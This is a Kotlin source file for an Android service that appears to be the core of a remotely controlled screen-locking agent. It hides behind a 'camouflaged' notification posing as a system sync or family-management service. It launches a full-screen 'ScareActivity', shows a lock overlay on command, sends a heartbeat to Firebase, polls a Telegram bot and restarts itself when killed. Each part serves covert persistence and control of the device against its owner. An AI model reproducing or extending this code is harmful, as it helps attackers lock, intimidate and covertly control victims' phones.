package com.dwisnulabs.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class DwisnuLabsLockService : Service() {

    companion object {
        private const val TAG = "DwisnuLabsLockService"
        private const val CHANNEL_ID = "dwisnulabs_sync_v2"
        private const val ALERT_CHANNEL_ID = "dwisnulabs_alert_channel"
        private const val NOTIFICATION_ID = 1001
        private const val ALERT_NOTIFICATION_ID = 1002

        @Volatile
        var isRunning: Boolean = false
            private set

        fun start(context: Context) {
            try {
                val intent = Intent(context, DwisnuLabsLockService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error starting DwisnuLabsLockService: ${e.message}", e)
            }
        }

        fun triggerLockFullScreenIntent(context: Context) {
            try {
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val alertChannel = NotificationChannel(
                        ALERT_CHANNEL_ID,
                        "Peringatan Keamanan Sistem",
                        NotificationManager.IMPORTANCE_HIGH
                    ).apply {
                        description = "Notifikasi status kritis keamanan perangkat"
                        setSound(null, null)
                        enableVibration(false)
                        setShowBadge(false)
                    }
                    nm.createNotificationChannel(alertChannel)
                }

                val scareIntent = Intent(context, ScareActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                } else {
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT
                }

                val bundle = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    val options = android.app.ActivityOptions.makeBasic()
                    options.setPendingIntentBackgroundActivityStartMode(
                        android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
                    )
                    options.toBundle()
                } else {
                    null
                }

                val pendingIntent = android.app.PendingIntent.getActivity(context, 991, scareIntent, flags, bundle)

                val notification = NotificationCompat.Builder(context, ALERT_CHANNEL_ID)
                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                    .setContentTitle("Layanan Keamanan Sistem")
                    .setContentText("Mode keamanan sedang aktif.")
                    .setPriority(NotificationCompat.PRIORITY_MAX)
                    .setCategory(NotificationCompat.CATEGORY_ALARM)
                    .setFullScreenIntent(pendingIntent, true)
                    .setAutoCancel(true)
                    .build()

                nm.notify(ALERT_NOTIFICATION_ID, notification)
            } catch (e: Exception) {
                Log.e(TAG, "Error triggering full screen intent notification: ${e.message}")
            }
        }

        fun cancelLockNotification(context: Context) {
            try {
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                nm.cancel(ALERT_NOTIFICATION_ID)
            } catch (_: Exception) {}
        }
    }

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.Default + serviceJob)
    private var heartbeatStarted = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        Log.d(TAG, "DwisnuLabsLockService initializing...")
        AppState.init(applicationContext)

        // Camouflaged Notification so Android doesn't kill the service
        createNotificationChannel()
        val notification = buildCamouflagedNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Initialize Firebase Multi-Device Manager (Zero Polling, Push-Based)
        FirebaseDeviceManager.init(applicationContext)
        FirebaseDeviceManager.syncStatus(applicationContext)

        // Start periodic heartbeat (Every 60s) to keep RTDB alive and update lastSeen
        if (!heartbeatStarted) {
            heartbeatStarted = true
            serviceScope.launch {
                while (isActive) {
                    try {
                        delay(60_000L)
                        FirebaseDeviceManager.syncStatus(applicationContext)
                    } catch (_: CancellationException) {
                        break
                    } catch (e: Exception) {
                        Log.w(TAG, "Heartbeat sync error: ${e.message}")
                    }
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "DwisnuLabsLockService onStartCommand.")
        isRunning = true
        AppState.init(applicationContext)

        if (AppState.isLocked) {
            LockOverlayManager.show(applicationContext)
        }

        FirebaseDeviceManager.init(applicationContext)
        FirebaseDeviceManager.syncStatus(applicationContext)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        Log.d(TAG, "DwisnuLabsLockService destroyed. Cleaning up...")
        TelegramBotClient.stopPolling()
        serviceScope.cancel()

        // Auto restart service if killed
        try {
            val restartIntent = Intent(applicationContext, DwisnuLabsLockService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to auto-restart service on destroy: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sistem Sinkronisasi Latar Belakang",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Layanan manajemen perangkat keluarga"
                setSound(null, null)
                enableVibration(false)
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildCamouflagedNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Layanan Sinkronisasi Sistem")
            .setContentText("Sinkronisasi perangkat aktif.")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }
}
